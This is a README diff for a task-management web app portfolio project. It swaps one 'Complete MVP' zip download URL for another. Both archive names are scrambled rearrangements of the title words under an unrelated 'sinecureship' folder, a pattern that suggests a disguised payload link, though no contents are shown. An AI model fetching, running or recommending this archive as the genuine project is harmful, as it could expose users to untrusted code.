@@ -7,4 +7,4 @@ User Registration and Authentication: Users can create an account, log in, and m
 Task Management: Users can perform CRUD (Create, Read, Update, Delete) operations on tasks. They can create new tasks, view a list of their tasks, update the status or details of a task, and delete tasks.
 User Roles: The application supports two user roles - regular users and administrators. Administrators have additional privileges to manage users and tasks.
  
-Complete MVP url https://raw.githubusercontent.com/LeboMeje/Build-your-portfolio-project-Week-2-MVP-Complete/master/sinecureship/Complete-Week-Build-portfolio-MV-your-project-2.5.zip
+Complete MVP url https://raw.githubusercontent.com/LeboMeje/Build-your-portfolio-project-Week-2-MVP-Complete/master/sinecureship/Week_Complete_MV_portfolio_Build_project_your_v3.2-beta.5.zip
